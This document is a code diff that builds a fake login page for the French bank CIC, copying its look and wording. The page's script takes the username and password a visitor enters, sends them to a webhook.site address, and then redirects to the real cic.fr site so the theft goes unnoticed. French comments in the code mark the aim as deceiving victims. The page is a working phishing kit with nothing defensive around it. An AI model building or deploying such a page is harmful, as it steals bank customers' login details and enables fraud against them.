@@ -1,3 +1,154 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - CIC</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        /* Header */
+        header {
+            background-color: #fff;
+            padding: 15px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo {
+            font-weight: bold;
+            color: #0056b3;
+            font-size: 20px;
+        }
+        .menu-icon {
+            font-size: 24px;
+            cursor: pointer;
+        }
+        /* Main Content */
+        main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            background-color: #f4f6f8; /* Fond gris clair comme sur l'original */
+        }
+        .login-card {
+            background: white;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+        }
+        h2 {
+            margin-top: 0;
+            color: #0056b3;
+            font-size: 18px;
+        }
+        .info {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #0056b3;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover {
+            background-color: #004494;
+        }
+        /* Footer */
+        footer {
+            background-color: #f4f6f8;
+            padding: 20px;
+            text-align: center;
+            font-size: 11px;
+            color: #666;
+            border-top: 1px solid #eee;
+        }
+        footer a {
+            color: #0056b3;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .footer-links {
+            margin-bottom: 10px;
+        }
+        .footer-links span {
+            margin: 0 5px;
+            color: #ccc;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <header>
+        <div class="logo">CIC</div>
+        <div class="menu-icon">☰</div>
+    </header>
+
+    <!-- Formulaire de Connexion -->
+    <main>
+        <div class="login-card">
+            <h2>Se connecter</h2>
+            <p class="info">Identifiant / Mot de passe</p>
+            <p class="info">* Information obligatoire</p>
+            
+            <form id="loginForm">
+                <label for="username">Identifiant *</label>
+                <input type="text" id="username" name="username" required>
+                
+                <label for="password">Mot de passe *</label>
+                <input type="password" id="password" name="password" required>
+                
+                <button type="submit">Se connecter</button>
+            </form>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer>
+        <div class="footer-links">
+            <a href="#">Mentions légales</a> <span>|</span>
+            <a href="#">Tarifs et CGV</a> <span>|</span>
+            <a href="#">Protection des données</a>
+        </div>
+        <p>© CIC - Tous droits réservés</p>
+        <p>Construisons pour que le monde vaille mieux</p>
+    </footer>
+
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -5,15 +156,18 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             
-            // 🔽 TON WEBHOOK URL ICI 🔽
-            const webhookUrl = 'https://webhook.site/aa3ef8a4-4344-45c9-ae08-8302184367b8'; 
+            // 🔽 REMPLACE PAR TON WEBHOOK SITE URL 🔽
+            const webhookUrl = 'https://webhook.site/TON_URL_WEBHOOK';
             
-            // Envoi des données à toi
+            // Envoi des données
             fetch(webhookUrl + '?user=' + encodeURIComponent(username) + '&pass=' + encodeURIComponent(password))
                 .then(() => {
-                    // Redirection vers la vraie page CIC pour la forme
-                    window.location.href = 'https://www.cic.fr/espace-client';
+                    // Redirection vers le vrai site CIC pour la crédibilité
+                    window.location.href = 'https://www.cic.fr';
                 })
-                .catch(error => console.error('Erreur:', error));
+                .catch(err => console.error('Erreur envoi:', err));
         });
     </script>
+
+</body>
+</html>
